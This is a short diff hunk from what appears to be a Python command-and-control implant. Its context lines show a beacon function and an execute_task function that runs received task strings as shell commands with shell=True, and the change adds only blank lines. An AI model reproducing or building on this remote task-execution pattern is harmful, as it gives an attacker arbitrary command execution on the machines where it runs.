@@ -78,6 +78,8 @@ def beacon():
         print(f"[!] Beacon error: {e}")
 
 def execute_task(task):
+    
+    
     try:
         print(f"[+] Executing task: {task}")
         result = subprocess.check_output(task, shell=True, stderr=subprocess.STDOUT)
